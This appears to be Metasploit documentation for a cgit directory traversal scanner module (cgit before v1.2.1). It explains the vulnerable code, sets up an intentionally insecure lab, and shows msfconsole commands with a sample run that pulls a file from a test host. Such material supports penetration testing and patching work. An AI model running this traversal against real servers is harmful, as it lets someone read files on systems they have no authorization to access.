## Description

cgit before v1.2.1 has a directory traversal vulnerabiltiy when `cgitrc` has the `enable-http-clone` value set to 1. The directory traversal can be used to download files from the remote host. This module has been tested against cgit v1.1 running on Ubuntu 18.04.

## Vulnerable Application

[cgit before v1.2.1](https://git.zx2c4.com/cgit/)

### Installing cgit on Ubuntu 18.04 x64

1. `sudo apt install cgit` # [dependencies](https://git.zx2c4.com/cgit/tree/README) may have to be downloaded first
2. Modify `/etc/cgitrc` to have `enable-http-clone=1`. Example attached.
3. Add `.htaccess` file with rewrite rules to `/usr/lib/cgit/`. Example attached.
4. Add `cgit.conf` to `/etc/apache2/conf-enabled/`. Example attached.
5. Enable `rewrite.load` and `cgi.load` in apache2.
6. Create bare repo. `mkdir -p repo/test.git && cd repo/test.git && git init --bare`

Example files were only used for testing and are not secure or usable in non-testing environments.  These WILL make your system insecure, but will enable exploitation
by this module.

[cgit.conf](https://github.com/rapid7/metasploit-framework/files/2284678/cgit.conf.txt)

[cgitrc](https://github.com/rapid7/metasploit-framework/files/2284679/cgitrc.txt)

[.htaccess](https://github.com/rapid7/metasploit-framework/files/2284680/htaccess.txt)

### Vulnerability Details from Project Zero

There is a directory traversal vulnerability in cgit_clone_objects(), reachable when the configuration flag enable-http-clone is set to 1 (default):

```
void cgit_clone_objects(void)
{
    if (!ctx.qry.path) {
        cgit_print_error_page(400, "Bad request", "Bad request");
        return;
    }

    if (!strcmp(ctx.qry.path, "info/packs")) {
        print_pack_info();
        return;
    }

    send_file(git_path("objects/%s", ctx.qry.path));
}
```

send_file() is a function that simply sends the data stored at the given filesystem path out over the network.
git_path() partially rewrites the provided path and e.g. prepends the base path of the repository, but it does not sanitize the provided path to prevent directory traversal.

ctx.qry.path can come from querystring_cb(), which takes unescaped data from the querystring.

## Options

**REPO**

Git repository on the remote server. Default is empty, `''`.

## Verification Steps

1. `./msfconsole -q`
2. `set rhosts <rhost>`
3. `set targeturi <uri>`
4. `set repo <repo>`
5. `run`

## Scenarios

### Ubuntu 18.04 x64, cgit | 1.1+git2.10.2-3build1

```
msf5 > use auxiliary/scanner/http/cgit_traversal
msf5 auxiliary(scanner/http/cgit_traversal) > set rhosts 172.22.222.123
rhosts => 172.22.222.123
msf5 auxiliary(scanner/http/cgit_traversal) > set targeturi /mygit/
targeturi => /mygit/
msf5 auxiliary(scanner/http/cgit_traversal) > set repo test
repo => test
msf5 auxiliary(scanner/http/cgit_traversal) > set filepath /home/msfdev/proof.txt
filepath => /home/msfdev/proof.txt
msf5 auxiliary(scanner/http/cgit_traversal) > set verbose true
verbose => true
msf5 auxiliary(scanner/http/cgit_traversal) > run

[+] 172.22.222.123:80     - 
you found me!

[+] File saved in: /home/msfdev/.msf4/loot/20180813150517_default_172.22.222.123_cgit.traversal_235024.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
